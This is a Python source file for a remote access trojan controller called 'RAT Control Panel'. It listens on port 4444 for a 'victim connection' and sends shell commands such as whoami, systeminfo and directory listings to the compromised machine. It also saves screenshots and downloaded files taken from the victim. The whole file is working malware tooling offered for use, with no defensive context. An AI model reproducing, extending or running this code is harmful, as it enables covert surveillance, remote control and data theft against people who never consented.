import socket
import struct
import os
import threading
import time
import queue
from datetime import datetime

SAVE_FOLDER = "screenshots"
os.makedirs(SAVE_FOLDER, exist_ok=True)

print("=" * 50)
print("  RAT Control Panel")
print("  Screenshots saved to: " + SAVE_FOLDER + "/")
print("=" * 50)
print()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("0.0.0.0", 4444))
server.listen(1)

print("[*] Listening on 0.0.0.0:4444")
print("[*] Waiting for victim connection...\n")

conn, addr = server.accept()
conn.settimeout(None)
print(f"[+] CONNECTION RECEIVED!")
print(f"[+] IP: {addr[0]}:{addr[1]}")
print()

# Thread-safe buffer
buffer_lock = threading.Lock()
read_buffer = b""

# Queue for command responses
response_queue = queue.Queue()

def recv_exact(n):
    """Receive exactly n bytes using global buffer"""
    global read_buffer
    while True:
        with buffer_lock:
            if len(read_buffer) >= n:
                data = read_buffer[:n]
                read_buffer = read_buffer[n:]
                return data
        try:
            chunk = conn.recv(65536)
            if not chunk:
                return None
            with buffer_lock:
                read_buffer += chunk
        except:
            return None

def receiver_thread():
    """Background thread that handles incoming data"""
    global read_buffer
    while True:
        try:
            # Read header: marker (1 byte) + length (4 bytes)
            header = recv_exact(5)
            if header is None:
                break
            
            marker = header[0:1]
            length = struct.unpack('>I', header[1:5])[0]
            
            if length == 0 or length > 10000000:  # Sanity check
                continue
            
            payload = recv_exact(length)
            if payload is None:
                break
            
            ts = datetime.now().strftime('%H:%M:%S')
            
            if marker == b'\x02':  # Screenshot
                filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.jpg"
                path = os.path.join(SAVE_FOLDER, filename)
                with open(path, "wb") as f:
                    f.write(payload)
                #print(f"\n[📸 {ts}] Screenshot saved: {filename} ({len(payload)/1024:.1f} KB)")
                #print("Command> ", end='', flush=True)
                
            elif marker == b'\x03':  # File download
                filename = f"downloaded_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.bin"
                path = os.path.join(SAVE_FOLDER, filename)
                with open(path, "wb") as f:
                    f.write(payload)
                print(f"\n[📁 {ts}] File downloaded: {filename} ({len(payload)/1024:.1f} KB)")
                print("Command> ", end='', flush=True)
                
            elif marker == b'\x01':  # Text output — put in queue for main thread
                response_queue.put(payload)
                
        except Exception as e:
            print(f"\n[-] Receiver error: {e}")
            break

# Start receiver thread
t = threading.Thread(target=receiver_thread, daemon=True)
t.start()

time.sleep(0.5)

print("\n" + "=" * 50)
print("  Commands:")
print("  whoami          - Current user")
print("  ipconfig        - Network info")
print("  systeminfo      - System details")
print("  dir / ls        - List directory")
print("  cd <path>       - Change directory")
print("  ss              - Manual screenshot")
print("  download <file> - Download a file")
print("  exit/quit       - Disconnect")
print("=" * 50)

while True:
    try:
        cmd = input("\nCommand> ").strip()
        if cmd.lower() in ['exit', 'quit']:
            print("[*] Closing connection...")
            break
        
        if not cmd:
            continue
        
        # Send command
        data = cmd.encode('utf-8')
        conn.sendall(struct.pack('>I', len(data)) + data)
        
        # Wait for response in queue (timeout after 30s)
        try:
            response = response_queue.get(timeout=30)
            text = response.decode('utf-8', errors='replace')
            print(f"\n{text}")
        except queue.Empty:
            print("\n[-] No response received (timeout)")
        
    except KeyboardInterrupt:
        print("\n[*] Interrupted")
        break
    except Exception as e:
        print(f"[-] Error: {e}")
        break

conn.close()
server.close()
print("[*] Connection closed")
